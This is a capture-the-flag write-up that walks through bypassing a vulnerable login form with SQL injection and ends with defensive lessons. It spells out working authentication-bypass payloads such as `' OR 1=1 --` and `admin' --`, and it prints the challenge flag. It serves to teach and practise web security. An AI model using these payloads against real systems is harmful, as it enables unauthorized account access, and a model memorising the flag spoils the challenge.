---
title: "SQL Injection - Login Bypass"
description: "Exploiting a vulnerable login form with classic SQL injection to bypass authentication and retrieve the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Easy               |
| Points     | 100                |
| Flag       | `zemi{sql_1nj3ct10n_ftw}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/sqli-login-bypass/app.py)
- [flag.txt](/Website/challenges/sqli-login-bypass/flag.txt)
- [README.md](/Website/challenges/sqli-login-bypass/README.md)
- [requirements.txt](/Website/challenges/sqli-login-bypass/requirements.txt)
- [setup.py](/Website/challenges/sqli-login-bypass/setup.py)

## Reconnaissance

We're given a basic login page at `http://challenge.ctf.local:8080/login`. The page has two fields — username and password — and a submit button. Nothing fancy in the page source, but the form POSTs to `/api/login`.

Let's start by testing for SQL injection with a single quote in the username field:

```
Username: '
Password: anything
```

The server responds with:

```
Error: unrecognized token: "'" near line 1
```

This confirms the input is being passed directly into a SQL query without sanitization.

## Analysis

Based on the error, the backend is likely running SQLite and constructing a query like:

```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>';
```

If we can manipulate the `WHERE` clause to always evaluate as true, we bypass the login entirely.

## Exploitation

We inject a classic authentication bypass payload:

```
Username: ' OR 1=1 --
Password: anything
```

This transforms the backend query into:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything';
```

Breaking this down:
- `''` — closes the original username string
- `OR 1=1` — makes the entire WHERE clause true
- `--` — comments out the rest of the query (the password check)

The server now returns all rows from the `users` table, and since the app only checks if a result was returned, we're logged in as the first user.

After logging in, we're redirected to `/dashboard` where the flag is displayed:

```
zemi{sql_1nj3ct10n_ftw}
```

## Alternative Approaches

You could also use `' OR '1'='1' --` or target a specific user:

```
Username: admin' --
Password: anything
```

This logs in specifically as `admin` by commenting out the password check.

## Tools Used

- Browser DevTools (inspecting form action and response)
- Burp Suite (optional, for intercepting and replaying requests)

## Lessons Learned

- **Never** concatenate user input directly into SQL queries
- Use parameterized queries or prepared statements
- ORMs like SQLAlchemy or Sequelize handle this automatically
- Always validate and sanitize input on the server side
- Error messages should never leak database internals to the user
